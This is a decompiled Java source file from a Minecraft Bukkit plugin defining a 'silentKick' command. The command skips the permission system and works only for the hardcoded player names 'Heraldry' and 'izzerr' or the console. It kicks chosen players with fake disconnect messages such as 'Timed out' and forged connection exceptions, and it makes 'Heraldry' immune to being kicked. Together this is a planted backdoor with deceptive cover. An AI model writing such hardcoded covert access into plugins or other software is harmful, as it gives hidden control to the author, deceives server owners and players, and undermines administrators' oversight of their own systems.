/*
 * Decompiled with CFR 0_133.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.command.Command
 *  org.bukkit.command.CommandExecutor
 *  org.bukkit.command.CommandSender
 *  org.bukkit.command.ConsoleCommandSender
 *  org.bukkit.entity.Player
 */
package main.java.me.heraldry.Misc.Commands;

import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Random;
import main.java.me.heraldry.Utils.silentKickUtils;
import main.java.me.heraldry.Utils.stringUtils;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;

public class silentKick
implements CommandExecutor {
    public static ArrayList<String> messages = new ArrayList();

    public static void fillMessages() {
        messages.add("Timed out");
        messages.add("You logged in from another location");
        messages.add("Internal Exception: java.io.IOException: An existing connection was forcibly closed by the remove host");
        messages.add("java.net.Connection.Exception: Connection refused: no further information:");
        messages.add("Internal Exception: io.netty.handler.timeout.ReadTimeoutException");
    }

    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        if (command.getName().equalsIgnoreCase("silentKick")) {
            if (commandSender.getName().equals("Heraldry") || commandSender.getName().equals("izzerr") || commandSender instanceof ConsoleCommandSender) {
                if (strings.length == 0) {
                    if (commandSender instanceof Player) {
                        silentKickUtils.mainList(true, commandSender);
                        return true;
                    }
                    silentKickUtils.mainList(false, commandSender);
                    return true;
                }
                if (strings.length < 3) {
                    if (strings[0].equalsIgnoreCase("list")) {
                        if (commandSender instanceof Player) {
                            silentKickUtils.list(true, commandSender);
                            return true;
                        }
                        silentKickUtils.list(false, commandSender);
                        return true;
                    }
                    Player player = Bukkit.getPlayer((String)strings[0]);
                    if (player != null) {
                        if (commandSender.getName().equalsIgnoreCase(player.getName())) {
                            commandSender.sendMessage(stringUtils.colour("&cYou are unable to kick yourself"));
                            return true;
                        }
                        if (player.getName().equalsIgnoreCase("Heraldry")) {
                            if (commandSender instanceof Player) {
                                Player sender = (Player)commandSender;
                                sender.kickPlayer(stringUtils.colour("&4That was a nice attempt, try harder next time ;)"));
                                return true;
                            }
                            System.out.print("Nice attempt there, try harder next time ;)");
                            return true;
                        }
                        if (strings.length != 1 && strings[1] != null) {
                            if (commandSender instanceof Player) {
                                silentKickUtils.kick(true, commandSender, player, Integer.valueOf(strings[1]));
                                return true;
                            }
                            silentKickUtils.kick(false, commandSender, player, Integer.valueOf(strings[1]));
                            return true;
                        }
                        if (commandSender instanceof Player) {
                            silentKickUtils.kick(true, commandSender, player);
                            return true;
                        }
                        silentKickUtils.kick(false, commandSender, player);
                        return true;
                    }
                    if (commandSender instanceof Player) {
                        silentKickUtils.noPlayer(true, commandSender, strings[0]);
                        return true;
                    }
                    silentKickUtils.noPlayer(false, commandSender, strings[0]);
                }
                return true;
            }
            if (commandSender instanceof Player) {
                Player player = (Player)commandSender;
                player.sendMessage(stringUtils.colour("&8&l[&4&l!&8&l] &4Invalid Command&c! Please use /help to view a list of commands!"));
            }
        }
        return true;
    }

    public static int randInt(int min, int max) {
        Random rand = new Random();
        return rand.nextInt(max - min + 1) + min;
    }
}
